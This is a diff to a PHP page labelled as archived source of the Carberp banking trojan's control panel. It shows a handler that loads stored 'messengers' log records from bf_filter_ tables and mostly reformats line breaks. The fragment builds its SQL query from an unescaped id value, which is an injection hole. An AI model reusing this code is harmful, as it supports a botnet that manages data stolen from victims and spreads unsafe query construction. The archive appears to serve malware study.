@@ -1,8 +1,20 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $smarty->assign('rand_name', mt_rand(0000000000, 9999999999));
 
-if(!empty($Cur['id']) && !empty($Cur['str'])){	switch($Cur['str']){
+if(!empty($Cur['id']) && !empty($Cur['str'])){
+	switch($Cur['str']){
 		case 'messengers':
         	$filter->name = 'Мессанджеры';
         	$filter->id = 'messengers';
@@ -47,7 +59,8 @@ if(!empty($Cur['id']) && !empty($Cur['str'])){	switch($Cur['str']){
 		break;
 	}
 
-	if($filter->id == $Cur['str']){		$log = $mysqli->query('SELECT * FROM bf_filter_'.$filter->id.' WHERE (id=\''.$Cur['id'].'\') LIMIT 1');
+	if($filter->id == $Cur['str']){
+		$log = $mysqli->query('SELECT * FROM bf_filter_'.$filter->id.' WHERE (id=\''.$Cur['id'].'\') LIMIT 1');
 
 		$smarty->assign('filter',$filter);
 		$smarty->assign('log',$log);
